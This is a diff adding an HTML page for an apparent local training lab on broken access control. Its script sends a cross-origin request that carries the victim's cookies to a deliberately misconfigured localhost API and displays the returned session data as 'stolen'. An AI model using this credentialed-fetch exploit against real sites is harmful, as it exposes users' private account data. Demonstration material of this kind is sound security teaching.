@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS Attack Demo</title>
+    <style>
+        body { font-family: system-ui, sans-serif; background: #1a1a2e; color: #eee; padding: 2rem; max-width: 640px; margin: 0 auto; }
+        pre { background: #16213e; padding: 1rem; border-radius: 8px; overflow-x: auto; }
+        button { padding: .6rem 1.2rem; background: #e94560; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: 600; }
+        input { width: 100%; padding: .5rem; margin: .5rem 0 1rem; border-radius: 6px; border: 1px solid #333; background: #0f0f23; color: #eee; }
+        .ok { color: #4ade80; }
+        .err { color: #f87171; }
+    </style>
+</head>
+<body>
+    <h1>CORS Misconfiguration Attack</h1>
+    <p>Open this page while logged into the BAC labs. It will try to read your session data from the vulnerable API.</p>
+
+    <label>API URL (adjust host/path if needed)</label>
+    <input id="apiUrl" value="http://localhost/A012025%20Broken%20Access%20Control/api/user.php">
+
+    <button onclick="steal()">Fetch victim data</button>
+
+    <h3>Result</h3>
+    <pre id="out">Click the button…</pre>
+
+    <script>
+        async function steal() {
+            const url = document.getElementById('apiUrl').value;
+            const out = document.getElementById('out');
+            out.textContent = 'Fetching…';
+            try {
+                const res = await fetch(url, {
+                    method: 'GET',
+                    credentials: 'include',   // send cookies
+                    headers: { 'Accept': 'application/json' }
+                });
+                const data = await res.json();
+                if (res.ok) {
+                    out.innerHTML = '<span class="ok">Stolen data:</span>\n' + JSON.stringify(data, null, 2);
+                } else {
+                    out.innerHTML = '<span class="err">HTTP ' + res.status + '</span>\n' + JSON.stringify(data, null, 2);
+                }
+            } catch (e) {
+                out.innerHTML = '<span class="err">Error (CORS blocked or network):</span>\n' + e.message;
+            }
+        }
+    </script>
+</body>
+</html>
